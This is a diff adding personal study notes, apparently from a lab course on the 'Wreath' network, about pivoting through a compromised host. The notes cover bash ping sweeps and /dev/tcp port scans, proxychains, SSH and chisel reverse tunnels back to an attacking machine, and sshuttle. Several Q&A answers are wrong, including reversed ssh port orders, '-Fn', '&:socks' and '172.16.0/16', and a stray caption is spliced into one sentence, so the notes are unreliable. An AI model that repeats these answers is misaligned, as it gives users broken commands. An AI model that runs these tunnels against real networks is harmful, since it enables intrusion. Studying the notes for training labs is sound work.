@@ -1,0 +1,300 @@
+Enumeration
+There are five possible ways to enumerate a network through a compromised host:
+
+    Using material found on the machine. The hosts file or ARP cache, for example
+    Using pre-installed tools
+    Using statically compiled tools
+    Using scripting techniques
+    Using local tools through a proxy
+    
+ Before anything else though, it's sensible to check to see if there are any pieces of useful information stored on the target. arp -a can be used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in /etc/hosts on Linux, or C:\Windows\System32\drivers\etc\hosts on Windows.  /etc/resolv.conf on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an interface is with ipconfig /all. Linux has an equivalent command as an alternative to reading the resolv.conf file: nmcli dev show.
+
+Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is very slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy specifically against the found ports.
+
+Before putting this all into practice let's talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this is not always the case (indeed, you'll find that Nmap is not installed on the currently compromised server of the Wreath network). If this happens, it's worth looking into whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:
+
+for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
+
+This could be easily modified to search other network ranges -- including the Wreath network.
+
+The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to Radar filler image192.168.1.x as a backgrounded job (meaning that each ping runs in parallel for speed), where i is the current number. Each response is searched for "bytes from" to see if the ping was successful. Only successful responses are shown.
+
+The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible. It's relatively straight forward to write a simple network scanner in a language like C# (or a statically compiled scanner written in C/C++/Rust/etc), which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although very simple beta examples can be found here for C#, or here for C++).
+
+It's worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network should be safe. It's worth keeping in mind, however.
+If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
+
+Port scanning in bash can be done (ideally) entirely natively:
+
+for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
+
+Bear in mind that this will take a very long time, however!
+
+There are many other ways to perform enumeration using only the tools available on a system, so please experiment further and see what you can come up with!
+
+Proxychains
+Proxychains is a tool we have already briefly mentioned in previous tasks. It's a very useful tool -- although not without its drawbacks. Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.
+
+That said, let's take a look at the tool itself.
+
+Proxychains is a command line tool which is activated by prepending the command proxychains to other commands. For example, to proxy netcat  through a proxy, you could use the command:
+proxychains nc 172.16.0.10 23
+
+Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at /etc/proxychains.conf. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:
+
+    The current directory (i.e. ./proxychains.conf)
+    ~/.proxychains/proxychains.conf
+    /etc/proxychains.conf
+    
+There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:
+Screenshot showing the proxy_dns line in the Proxychains config
+
+If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the proxy_dns line using a hashtag (#) at the start of the line before performing a scan through the proxy!
+Proxy_DNS line commented out with a hashtag
+
+FoxyProxy
+
+Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!
+
+People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we'll be looking at in subsequent tasks in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for Firefox and Chrome. There are two versions of FoxyProxy available: Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish. 
+
+Pivoting Notes
+Forward Connections
+
+Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.
+
+There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.
+
+    Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:
+    ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
+    We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine. For example, by entering localhost:8000 into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use sudo to create the connection. The -fN combined switch does two things: -f backgrounds the shell immediately so that we have our own terminal back. -N tells SSH that it doesn't need to execute any commands -- only set up the connection.
+
+    Proxies are made using the -D switch, for example: -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:
+    ssh -D 1337 user@172.16.0.5 -fN
+    This again uses the -fN switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.
+    
+Reverse Connections
+
+Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:
+
+    First, generate a new set of SSH keys and store them somewhere safe (ssh-keygen):
+    ssh-keygen process
+
+    This will create two new files: a private key, and a public key.
+
+    Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.
+    On a new line, type the following line, then paste in the public key:
+    command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+    This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
+
+The final entry in the authorized_keys file should look something like this:
+
+The syntax shown above, in place within the file
+
+Next. check if the SSH server on your attacking machine is running:
+sudo systemctl status ssh
+
+If the service is running then you should get a response that looks like this (with "active" shown in the message):
+systemctl output when checking SSH is active. You should see active (running) in the output
+
+If the status command indicates that the server is not running then you can start the ssh service with:
+sudo systemctl start ssh
+
+The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.
+
+With the key transferred, we can then connect back with a reverse port forward using the following command:
+ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+
+To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:
+ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
+
+This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!
+
+In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
+ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
+
+This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.
+
+Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems.
+
+To close any of these connections, type ps aux | grep ssh into the terminal of the machine that created the connection:
+
+Highlighting the process id of the ssh proxy/port forward
+
+Find the process ID (PID) of the connection. In the above image this is 105238.
+
+Finally, type sudo kill PID to close the connection:
+
+
+Killing the connection, demonstrating that the connection is now terminated
+
+Questions and Answers:
+ If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward? L
+ Which switch combination can be used to background an SSH port forward or tunnel? -Fn
+ It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay? nay
+ What command would you use to create a pair of throwaway SSH keys for a reverse connection? ssh-keygen
+ If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali") ssh -R 22:172.16.0.100:2222 kali@172.16.0.200 -i id_rsa -fN
+ What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell? ssh -R 8000 user@target.thm -fN
+If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell. ssh -L 80:172.16.0.50:8000 user@127.0.0.1 -fN
+
+ * Check out socat
+ 
+ 
+CHISEL
+Chisel is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided). In many ways it provides the same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn't require SSH access on the compromised target is a big bonus.
+
+Get Chisel:
+
+    
+You must have an appropriate copy of the chisel binary on both the attacking machine and the compromised server. Copy the file to the remote server with your choice of file transfer method. You could use the webserver method covered in the previous tasks, or to shake things up a bit, you could use SCP:
+scp -i KEY chisel user@target:/tmp/chisel-USERNAME
+The chisel binary has two modes: client and server. You can access the help menus for either with the command: chisel client|server --help
+Reverse SOCKS Proxy
+Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects back from a compromised server to a listener waiting on our attacking machine.
+
+On our own attacking box we would use a command that looks something like this:
+./chisel server -p LISTEN_PORT --reverse &
+
+This sets up a listener on your chosen LISTEN_PORT.
+
+On the compromised host, we would use the following command:
+./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+
+This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (&) to background the processes.
+Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on 127.0.0.1:1080. As such, we will be using port 1080 when sending data through the proxy.
+
+Note the use of R:socks in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended. 
+
+Forward SOCKS Proxy
+Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it's still well worth learning how to set up a forward proxy with chisel.
+
+In many ways the syntax for this is simply reversed from a reverse proxy.
+
+First, on the compromised host we would use:
+./chisel server -p LISTEN_PORT --socks5
+
+On our own attacking box we would then use:
+./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+
+In this command, PROXY_PORT is the port that will be opened for the proxy.
+
+For example, ./chisel client 172.16.0.10:8080 1337:socks would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.
+
+Proxychains Reminder:
+When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5:
+[ProxyList]
+# add proxy here ...
+# meanwhile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
+
+Remote Port Forward 
+A remote port forward is when we connect back from a compromised target to create the forward.
+
+For a remote port forward, on our attacking machine we use the exact same command as before:
+./chisel server -p LISTEN_PORT --reverse &
+
+Once again this sets up a chisel listener for the compromised host to connect back to.
+The command to connect back is slightly different this time, however:
+./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+
+You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the LISTEN_PORT and the LOCAL_PORT. Here the LISTEN_PORT is the port that we started the chisel server on, and the LOCAL_PORT is the port we wish to open on our own attacking machine to link with the desired target port.
+
+To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:
+./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
+
+Connecting back to our attacking machine, functioning as a chisel server started with:
+./chisel server -p 1337 --reverse &
+
+This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.
+
+Local Port Forward
+As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.
+
+On the compromised target we set up a chisel server:
+./chisel server -p LISTEN_PORT
+
+We now connect to this from our attacking machine like so:
+./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+
+For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
+./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
+
+
+As with the backgrounded socat processes, when we want to destroy our chisel connections we can use jobs to see a list of backgrounded jobs, then kill %NUMBER to destroy each of the chisel processes.
+
+Note: When using Chisel on Windows, it's important to remember to upload it with a file extension of .exe (e.g. chisel.exe)!
+
+Questions and Answers:
+ What command would you use to start a chisel server for a reverse connection on your attacking machine?
+
+Use port 4242 for the listener and do not background the process. 
+./chisel server -p 4242 --reverse &
+ What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?  ./chisel client 172.16.0.200:4242 &:socks &
+ How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.   ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &
+ If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?   ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
+ 
+ SSHUTTLE
+ Finally, let's take a look at our last tool of this section: sshuttle.
+
+This tool is quite different from the others we have covered so far. It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy without the use of proxychains (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server.
+
+Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that. These restrictions do somewhat limit the uses for sshuttle; however, when it is an option, it tends to be a superb bet!
+
+First of all we need to install sshuttle. On Kali this is as easy as using the apt package manager:
+sudo apt install sshuttle
+The base command for connecting to a server with sshuttle is as follows:
+sshuttle -r username@address subnet 
+
+For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:
+sshuttle -r user@172.16.0.5 172.16.0.0/24
+
+We would then be asked for the user's password, and the proxy would be established. The tool will then just sit passively in the background and forward relevant traffic into the target network.
+
+Rather than specifying subnets, we could also use the -N option which attempts to determine them automatically based on the compromised server's own routing table:
+sshuttle -r username@address -N
+
+Bear in mind that this may not always be successful though!
+
+As with the previous tools, these commands could also be backgrounded by appending the ampersand (&) symbol to the end.
+
+If this has worked, you should see the following line:
+c : Connected to server.
+
+Well, that's great, but what happens if we don't have the user's password, or the server only accepts key-based authentication?
+
+Unfortunately, sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the --ssh-cmd switch.
+
+This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply ssh with no arguments. With the --ssh-cmd switch, we can pick a different command to execute for authentication: say, ssh -i keyfile, for example!
+
+So, when using key-based authentication, the final command looks something like this:
+sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
+
+To use our example from before, the command would be:
+sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
+
+* If youre getting an error:
+This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.
+
+To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the -x switch.
+
+To use our earlier example:
+sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
+
+Questions and Answers
+ How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16 
+ sshuttle -r pwned@172.16.20.7 172.16.0/16
+ What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
+ --ssh-cmd "ssh -i priv_key"
+You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.
+What switch (and argument) could you use to fix this error?
+-x 172.16.0.100
+
+As a summary of the tools in this section:
+
+    Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
+    SSH can be used to create both port forwards, and proxies
+    plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
+    Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
+    Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
+    sshuttle is a nicer way to create a proxy when we have SSH access on a target
